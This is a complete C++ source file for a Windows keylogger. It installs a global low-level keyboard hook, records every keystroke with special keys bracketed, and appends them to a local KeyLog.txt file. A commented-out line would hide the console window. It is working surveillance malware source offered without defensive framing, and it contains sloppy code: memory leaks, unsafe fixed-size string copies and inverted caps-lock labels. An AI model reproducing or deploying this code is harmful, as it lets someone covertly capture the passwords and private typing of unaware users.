#include <iostream>
#include <fstream>
#include <Windows.h>
//#include <string.h>
#include <string>
#pragma comment(lib, "user32.lib")

using namespace std;

HHOOK keyboardHook = NULL;

fstream f;
//FILE *f;
void openFile(char * fileName) 
{
	f.open(fileName, ios::app);
	//f = fopen(fileName, "a");
}

void closeFile()
{
	if (f.is_open())
	{
		f.close();
	}
	//fclose(f);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION) 
	{
		if (wParam == WM_KEYDOWN) {
			wchar_t tmp[0xFF] = {0};
			KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lParam);
						
			// Get key name as string
			DWORD msg = 1;
			msg += (keyInfo.scanCode << 16);
			msg += (keyInfo.flags << 24);
			GetKeyNameText(msg, tmp, 0xFF);

			// Convert wchar_t to char *
			char* keyName = new char[20];
			wcstombs(keyName, tmp, 20);
			
			// add some special keys
			switch (keyInfo.vkCode)
			{
			case VK_LMENU:
				strcpy(keyName, "Left Alt");
				break;
			case VK_RMENU:
				strcpy(keyName, "Right Alt");
				break;
			case VK_LSHIFT:
				strcpy(keyName, "Left Shift");
				break;
			case VK_RSHIFT:
				strcpy(keyName, "Right Shift");
				break;
			case VK_LCONTROL:
				strcpy(keyName, "Left Control");
				break;
			case VK_RCONTROL:
				strcpy(keyName, "Right Control");
				break;	
			case VK_CAPITAL:
				strcpy(keyName, (GetKeyState(VK_CAPITAL)) ? "CAP_OFF" : "CAP_ON");
				break;
			}

			bool isSpecialKey = (strlen(keyName) <= 1) ? false : true;
			
			if (isSpecialKey)
			{
				char * keynametmp = new char[20];
				strcpy(keynametmp, "[");
				strcat(keynametmp, keyName);
				strcat(keynametmp, "]");
				strcpy(keyName, keynametmp);
			}

			//cout << keyName << endl;

			if (f.is_open()) 
			{
				f << keyName << endl;
			}

			/*if (f != NULL)
			{
				fprintf(f, "%s ", keyName);
			}*/
		}
	}	
	
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main(int argc, char* argv[])
{
	// hide console window
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	

	openFile(".\\KeyLog.txt");
	// moc
	// HHOOK SetWindowsHookEx(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId)
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (keyboardHook == NULL) {
		std::cout << "Keyboard hook failed!" << std::endl;
	}

	// giu chuong trinh chay
	MSG msg;


	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	closeFile();
	UnhookWindowsHookEx(keyboardHook);
	return 0;
}